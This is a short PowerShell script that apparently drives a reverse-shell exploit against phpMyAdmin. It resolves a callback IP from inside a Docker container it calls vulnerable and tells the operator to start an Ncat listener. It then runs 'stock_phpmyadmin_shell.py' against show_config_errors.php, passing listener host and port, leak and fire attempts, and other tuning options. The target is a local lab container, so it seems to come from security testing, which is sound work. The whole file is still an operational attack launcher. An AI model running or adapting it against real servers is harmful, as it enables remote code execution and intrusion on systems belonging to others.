$ErrorActionPreference = "Stop"

Set-Location -LiteralPath $PSScriptRoot

$callbackLine = docker exec p2s-phpmyadmin-functional-stock getent hosts host.docker.internal |
    Select-Object -First 1
$callbackIp = ($callbackLine -split '\s+')[0]
if (-not $callbackIp) {
    throw "Could not resolve host.docker.internal from the vulnerable container"
}

Write-Host "Callback target: $callbackIp`:4461" -ForegroundColor Cyan
Write-Host "Start the Ncat listener in the other terminal before continuing." -ForegroundColor Yellow

python .\stock_phpmyadmin_shell.py `
    --url http://127.0.0.1:18212/show_config_errors.php `
    --lhost $callbackIp `
    --lport 4461 `
    --host-header x `
    --blockers 148 `
    --settle 10 `
    --leak-tries 3 `
    --fire-tries 1 `
    --timeout 180 `
    --ack-exact-profile

if ($LASTEXITCODE -ne 0) {
    throw "Exploit runner failed"
}
